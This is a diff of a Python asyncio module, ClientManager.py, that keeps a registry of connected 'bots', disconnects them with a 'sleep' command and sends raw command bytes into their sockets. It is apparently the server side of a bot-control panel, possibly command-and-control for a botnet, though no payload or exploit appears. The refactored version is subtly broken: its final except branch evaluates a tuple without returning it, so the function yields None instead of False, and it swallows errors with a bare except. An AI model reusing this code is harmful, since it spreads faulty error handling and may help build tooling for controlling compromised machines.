@@ -1,57 +1,29 @@
 # backend/Services/ClientManager.py
+import logs.LoggerWrapper as logger
 
-from logs import Log as logger
+active_clients = {}
 
-# Глобальный реестр активных соединений {id: (reader, writer)}
-client = {}
-
-async def close_client(client_id, send_sleep=True):
-    """Принудительное закрытие сессии бота со стороны сервера"""
-    if client_id not in client:
-        return False
-        
-    _, writer = client.get(client_id, (None, None))
-    if not writer:
-        return False
-
+async def close_client(bot_id, send_sleep=True):
+    if not (session := active_clients.get(bot_id)): return False
+    reader, writer = session
     try:
-        if send_sleep:
-            # Даем боту команду корректно завершить работу
-            writer.write(b"sleep\n") 
-            await writer.drain()
-        
-        writer.close()
-        await writer.wait_closed()
-    except Exception: 
-        pass
+        if send_sleep: (writer.write(b"sleep\n"), await writer.drain())
+        writer.close(); await writer.wait_closed()
+    except: pass
     finally:
-        # Удаляем из реестра без отправки уведомлений в UI (это сделает Handler)
-        client.pop(client_id, None)
-        logger.info(f"[-] Бот {client_id} принудительно отключен")
+        active_clients.pop(bot_id, None)
+        logger.Log.info(f"[-] Бот {bot_id} отключен")
     return True
 
-async def close_all_client():
-    """Массовое отключение всех активных ботов"""
-    ids = list(client.keys())
-    for cid in ids:
-        await close_client(cid)
-    return len(ids)
+async def close_all_clients():
+    return sum([await close_client(bot_id) for bot_id in list(active_clients.keys())])
 
 def list_clients():
-    """Возвращает список ID всех ботов, находящихся в сети"""
-    return [{"id": cid, "status": "online"} for cid in client.keys()]
+    return [{"id": bot_id, "status": "online"} for bot_id in active_clients]
 
 async def send_binary_to_bot(bot_id, packet):
-    """Отправка сырых байтов (команд) напрямую в сокет бота"""
-    session = client.get(bot_id)
-    if not session:
-        return False
-        
+    if not (session := active_clients.get(bot_id)): return False
     try:
-        _, writer = session
-        writer.write(packet)
-        await writer.drain()
+        session[1].write(packet); await session[1].drain()
         return True
-    except Exception as e:
-        logger.error(f"[Manager] Send error to {bot_id}: {e}")
-        return False
+    except Exception as error: (logger.Log.error(f"[Manager] Send error {bot_id}: {error}"), False)
